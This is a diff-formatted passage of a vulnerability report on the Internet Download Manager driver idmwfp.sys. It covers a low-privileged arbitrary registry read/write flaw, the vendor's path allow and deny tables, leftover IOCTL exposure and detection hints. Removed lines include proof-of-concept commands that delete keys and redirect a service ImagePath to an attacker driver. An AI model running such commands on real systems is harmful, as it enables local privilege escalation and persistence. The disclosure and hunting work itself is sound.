-.\idmwfp_reg_demo.exe query machine "SOFTWARE\IDMWFPRegDemo\Path" 256
-```
-
-Expected output includes:
+The two recovered policy tables:
 
 ```text
-type=2
-value(expand_sz)=\SystemRoot\System32\drivers\Test.sys
+Allowed roots:
+  SOFTWARE\Internet Download Manager\*
+  SOFTWARE\WOW6432Node\Internet Download Manager\*
+  SOFTWARE\Classes\CLSID\*
+
+Denied path components:
+  AppID
+  *ProgID
+  InprocServer*
+  LocalServer*
+  InprocHandler*
+  PersistentHandler*
+  TypeLib
+  TreatAs
+  DefaultExtension
 ```
 
-### 9.6 Delete Value and Key
-
-```powershell
-.\idmwfp_reg_demo.exe del-value machine "SOFTWARE\IDMWFPProbe2\Val"
-.\idmwfp_reg_demo.exe del-key machine "SOFTWARE\IDMWFPProbe2\Val"
-```
-
-This demonstrates that:
-
-- An ordinary user can not only write, but also remove or destroy sensitive configuration paths
-
-### 9.7 High-Risk Path Example
-
-For example, an attacker can attempt to write:
-
-```powershell
-.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\<Target>\ImagePath" "\SystemRoot\System32\drivers\Attacker.sys"
-```
-
-Such paths reside under:
-
-- `HKLM\SYSTEM\CurrentControlSet\Services\...`
-
-and are clearly outside IDM’s legitimate configuration scope.
+For the direct exploitation path of this vulnerability the fix is effective (`HKLM\SYSTEM\CurrentControlSet\Services\...` does not match the allow table), but it leaves the device interface open to all authenticated users, and the exposure of the driver's remaining IOCTLs (cross-PID policy delivery, event binding, notification queue reads, WFP filter deletion, and so on) is not narrowed; those interfaces carry no caller validation of their own either.
 
 ---
 
-## 10. Root Cause Summary
+## 8. Detection and Hunting
 
-The vulnerability requires two conditions to hold, and this driver satisfies both:
+Exploitation of this vulnerability leaves traces at the registry level; the following are worth checking:
 
-1. The device object is open to all authenticated users
-2. IOCTL handlers perform privileged registry operations without authorization or namespace restrictions
-
-In essence, this is:
-
-- “a kernel-proxy registry interface callable by low-privileged users”
-
-rather than:
-
-- “a restricted interface used only for IDM-owned configuration”
-
----
-
-## 11. Security Recommendations
-
-At minimum, the following issues should be fixed:
-
-### 11.1 Tighten the Device ACL
-
-The driver should not use:
-
-- `D:P(A;;GA;;;AU)`
-
-It should instead allow only:
-
-- Administrators
-- `SYSTEM`
-- An IDM-owned service SID
-
-### 11.2 Enforce a Registry Path Whitelist
-
-`subcmd 0x0C..0x0F` should be strictly limited to IDM-owned registry namespaces, for example:
-
-- `HKLM\SOFTWARE\Wow6432Node\Internet Download Manager\...`
-- Or another explicit, minimal allowlist defined by the vendor
-
-The driver should never allow caller-supplied arbitrary relative paths.
-
-### 11.3 Add Caller Authorization Checks
-
-Even if the path falls within an allowed namespace, the driver should still validate:
-
-- Caller SID / token
-- Whether the caller is a trusted service
-- Whether the caller has administrative privileges
-
-### 11.4 Prevent Generic `HKLM` / `HKU` Access by Ordinary Users
-
-In particular, ordinary users must not be allowed to bypass normal ACLs via a kernel driver proxy.
-
----
-
-## 12. Conclusion
-
-This is a high-severity kernel driver logic vulnerability.
-
-`idmwfp.sys` exposes a kernel-backed registry read/write capability over arbitrary paths in `HKLM` and `HKU` to low-privileged users through an IOCTL interface open to all authenticated users.
-
-This kind of capability alone is sufficient to be viewed as:
-
-- A security-boundary break
-- A high-risk local privilege escalation primitive
-- A high-privilege persistence primitive
-
-From a defensive perspective, this should not be downgraded to a mere “configuration issue” or “misuse of a private product interface,” because:
-
-- The affected namespace is not IDM-owned
-- The actual targets are system-level, high-value registry roots
-- The issue is reproducible by an ordinary user
-
-Therefore, the vendor should fix it as soon as possible, and ZDI should treat it as a kernel-driver vulnerability leading to local privilege escalation via arbitrary registry read/write.
+- Whether `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath` points to a path outside `%SystemRoot%`, or to a user-writable directory;
+- Whether `RequiredPrivileges` contains a large number of privileges beyond `SeTcbPrivilege`, especially `SeDebugPrivilege`, `SeLoadDriverPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege` appearing together;
+- Whether service installation/configuration change events in the system log (4697, 7040, 7045) correlate in time with registry writes unrelated to `Microsoft-Windows-Kernel-...`.
